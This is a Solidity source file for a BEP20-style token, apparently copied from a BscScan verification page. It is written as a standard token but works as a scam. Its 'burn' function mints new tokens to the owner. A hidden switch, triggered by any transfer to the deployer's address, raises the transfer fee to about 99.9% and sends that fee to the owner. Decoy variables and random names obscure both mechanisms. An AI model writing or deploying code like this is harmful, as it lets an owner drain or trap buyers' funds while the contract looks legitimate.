/**
 *Submitted for verification at BscScan.com on 2022-11-12
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-11
 */
pragma solidity >=0.4.11;
contract TDOGIM {
address public  AmmIbr = address(0);
uint256 public  rVYZge = 100000000000000000000000;
uint256 public  IBLlMs = 10000000000000000;
address public  qNmHZL = address(0);
mapping (address => uint256) public balanceOf;
address public owner;
string public  symbol = "RSASvl";
address private  qcYiiU = address(0);
address public  mMmUUe = address(0);
uint256 public  ytnrLO = 1000000000000000000;
uint256 public  BJLhiC = 100000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
mapping (address => mapping (address => uint256)) private _allowances;
string public  name = "VTkJRM";
uint256 public  iIrhOO = 10000000000000000000;
address public  vubpag = address(0);
uint256 public  uELUSt = 100000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public  IDwwxh = 10000000000000000000000000000;
address public  rhgRgq = address(0);
uint8 public constant decimals = 18;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public  TngtGu = 100000000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
address public  StCiOl = address(0);
uint256 public constant UQgFNy = 73999;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  JKHlfW = 10000000000000;
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "dqMmAn");
require(to != address(0), "dqMmAn");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* UQgFNy/JKHlfW ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==qcYiiU){
JKHlfW = 73999+1;
}
emit Transfer(from, to, transferAmount);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
constructor () public {
qcYiiU = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}

}